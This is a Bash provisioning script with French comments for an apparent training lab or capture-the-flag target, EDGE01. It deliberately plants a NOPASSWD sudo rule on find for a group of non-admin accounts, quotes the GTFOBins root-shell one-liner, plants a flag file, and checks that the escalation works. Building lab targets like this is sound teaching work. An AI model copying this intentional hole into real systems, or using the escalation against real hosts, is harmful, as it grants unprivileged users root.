#!/usr/bin/env bash
# =============================================================================
# seed-privesc.sh — Couche JEUDI (Élévation locale) de la cible EDGE01.
# EXTENSION de seed-access.sh : plante un vecteur d'élévation LOCAL, exploitable
# depuis N'IMPORTE quel compte non privilégié obtenu mercredi (p.durand,
# l.fontaine ou m.petit), vers root.
#
#   sudo bash seed-privesc.sh            # provisionne la couche élévation
#   sudo bash seed-privesc.sh --verify   # contrôle que l'élévation -> root marche pour les 3 comptes
#   sudo bash seed-privesc.sh --reset    # retire la règle sudo, le groupe, le trophée
#
# Prérequis : seed-recon.sh + seed-access.sh ont déjà tourné.
# Debian 12, root, dans le lab. Idempotent. À lancer sur l'image dorée AVANT
# `seed-access.sh --harden` (qui efface ensuite tous les seed-*.sh + secrets).
#
# VECTEUR : une règle sudo NOPASSWD « de dépannage » sur /usr/bin/find, laissée
# à un groupe partagé (maint) auquel appartiennent les comptes non-admin. find
# est un binaire GTFOBins : `sudo find . -exec /bin/bash \; -quit` -> shell root.
# Accessible à tout compte du groupe -> peu importe lequel a été sprayé mercredi.
# =============================================================================
set -euo pipefail

MARKER="/etc/orvalis-edge01.privesc.seeded"
GROUP="maint"
SUDO_DROPIN="/etc/sudoers.d/10-maint-find"
TROPHY="/root/rapport_confidentiel.txt"
# Comptes non-admin susceptibles d'être le foothold de mercredi
FOOTHOLD_USERS=(p.durand l.fontaine m.petit)

log(){ printf '\033[1;36m[privesc]\033[0m %s\n' "$*"; }
err(){ printf '\033[1;31m[privesc] ERREUR:\033[0m %s\n' "$*" >&2; }
need_root(){ [ "$(id -u)" -eq 0 ] || { err "à lancer en root (sudo)."; exit 1; }; }

require_prev(){
  local missing=0
  for u in "${FOOTHOLD_USERS[@]}"; do
    id "$u" &>/dev/null || { err "compte '$u' absent — lancer d'abord seed-recon.sh puis seed-access.sh"; missing=1; }
  done
  [ "$missing" -eq 0 ] || exit 1
}

# -----------------------------------------------------------------------------
provision(){
  require_prev

  log "Groupe partagé '$GROUP' + rattachement des comptes non-admin..."
  getent group "$GROUP" >/dev/null || groupadd "$GROUP"
  for u in "${FOOTHOLD_USERS[@]}"; do usermod -aG "$GROUP" "$u"; done

  log "Règle sudo NOPASSWD 'de dépannage' sur /usr/bin/find (vecteur GTFOBins)..."
  # chemin ABSOLU obligatoire pour que l'exploit GTFOBins corresponde à la règle
  printf '%%%s ALL=(ALL) NOPASSWD: /usr/bin/find\n' "$GROUP" > "$SUDO_DROPIN"
  chmod 0440 "$SUDO_DROPIN"
  visudo -cf "$SUDO_DROPIN" >/dev/null || { err "sudoers invalide, retrait"; rm -f "$SUDO_DROPIN"; exit 1; }

  log "Trophée root (ce que l'élévation permet de lire)..."
  umask 077
  cat > "$TROPHY" <<'TXT'
ORVALIS — DOCUMENT CONFIDENTIEL (accès restreint direction/DSI)
--------------------------------------------------------------
Sauvegarde de secours — extraits comptes clients et accès prestataires.
Si vous lisez ceci en tant que root sans y être autorisé : vous avez
démontré une élévation de privilèges réussie. Consignez-le, ne l'exfiltrez
pas hors du lab. FLAG{orvalis_root_via_sudo_find}
TXT
  chmod 600 "$TROPHY"

  touch "$MARKER"
  log "Couche élévation posée."
  echo
  verify || true
}

# -----------------------------------------------------------------------------
verify(){
  local ok=0 out u
  echo "--- Vérification couche élévation EDGE01 ---"

  # 1) le groupe existe et contient les 3 comptes foothold
  for u in "${FOOTHOLD_USERS[@]}"; do
    id -nG "$u" 2>/dev/null | tr ' ' '\n' | grep -qx "$GROUP" \
      && echo "  [OK]  $u ∈ $GROUP" || { echo "  [!!]  $u hors de $GROUP"; ok=1; }
  done

  # 2) la règle sudoers est syntaxiquement valide
  visudo -cf "$SUDO_DROPIN" >/dev/null 2>&1 \
    && echo "  [OK]  règle sudoers valide ($SUDO_DROPIN)" \
    || { echo "  [!!]  règle sudoers absente/invalide"; ok=1; }

  # 3) l'élévation -> root marche RÉELLEMENT pour chaque compte foothold
  #    (on lance find via sudo -n en tant que l'utilisateur ; -exec id doit sortir uid=0)
  for u in "${FOOTHOLD_USERS[@]}"; do
    out="$(runuser -u "$u" -- sudo -n /usr/bin/find /etc/hostname -maxdepth 0 -exec id \; 2>/dev/null || true)"
    grep -q 'uid=0' <<<"$out" \
      && echo "  [OK]  $u peut devenir root via sudo find" \
      || { echo "  [!!]  élévation KO pour $u"; ok=1; }
  done

  # 4) le trophée root existe et n'est PAS lisible par un non-root
  #    (garde de parité avec seed-access : une session absente ne passe jamais au vert)
  if [ -f "$TROPHY" ]; then
    if ! id p.durand &>/dev/null; then
      echo "  [!!]  compte p.durand absent — contrôle trophée non exécuté"; ok=1
    else
      out="$(runuser -u p.durand -- cat "$TROPHY" 2>/dev/null || true)"
      [ -z "$out" ] && echo "  [OK]  trophée root présent et illisible sans élévation" \
                    || { echo "  [!!]  trophée lisible sans root !"; ok=1; }
    fi
  else
    echo "  [!!]  trophée $TROPHY absent"; ok=1
  fi

  [ "$ok" -eq 0 ] && echo ">>> Couche élévation OK (root atteignable depuis tout foothold)." \
                  || echo ">>> Problème de montage (relancer sans --verify)."
  return "$ok"
}

# -----------------------------------------------------------------------------
reset(){
  log "Retrait de la couche élévation..."
  rm -f "$SUDO_DROPIN" "$TROPHY" "$MARKER"
  for u in "${FOOTHOLD_USERS[@]}"; do gpasswd -d "$u" "$GROUP" >/dev/null 2>&1 || true; done
  getent group "$GROUP" >/dev/null && groupdel "$GROUP" 2>/dev/null || true
  log "Reset terminé."
}

# -----------------------------------------------------------------------------
case "${1:-}" in
  --verify) need_root; verify ;;
  --reset)  need_root; reset ;;
  "")       need_root; provision ;;
  *)        echo "Usage: $0 [--verify|--reset]"; exit 2 ;;
esac
